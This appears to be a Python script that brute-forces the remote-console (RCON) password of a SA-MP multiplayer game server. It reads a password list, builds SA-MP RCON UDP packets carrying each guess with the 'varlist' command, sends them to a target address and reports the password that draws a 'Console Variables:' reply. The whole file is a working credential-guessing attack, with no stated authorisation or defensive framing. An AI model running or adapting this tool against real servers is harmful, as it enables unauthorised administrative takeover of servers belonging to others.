import socket

ip = "127.0.0.1"
port = 7777
packet = ""

split_ip = ip.split(".")

passwords = []

with open("passwords.txt") as f:
    passwords = [line.strip() for line in f if line.strip()]

def build_and_send_packet(password):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0.01)
    packet = b"SAMP"

    for octet in split_ip:
        packet += int(octet).to_bytes(1, byteorder='little')

    packet += (port & 0xFF).to_bytes(1, byteorder='little')         # get the first byte of the port
    packet += ((port >> 8) & 0xFF).to_bytes(1, byteorder='little')  # get the second byte of the port

    packet += b"x"

    # first byte of the length of the RCON password
    packet += (len(password) & 0xFF).to_bytes(1, byteorder='little') 

    # second byte of the length of the RCON password
    packet += ((len(password) >> 8) & 0xFF).to_bytes(1, byteorder='little') 
    packet += password.encode('latin1')

    # first byte of the length of the RCON command
    packet += (len("varlist") & 0xFF).to_bytes(1, byteorder='little')  

    # second byte of the length of the RCON command
    packet += ((len("varlist") >> 8) & 0xFF).to_bytes(1, byteorder='little')  

    packet += "varlist".encode('latin1')

    print(f"Trying: {password}", end="    \r", flush=True)

    s.sendto(packet, (ip, port))

    try:
        data, addr = s.recvfrom(2048)
        if "Console Variables:" in data.decode():
            print(f"RCON password: " + password)
            exit()

    except TimeoutError:
        s.close()
        build_and_send_packet(password)
    except ConnectionResetError:
        print("Connection reset.")

for password in passwords:
    build_and_send_packet(password)
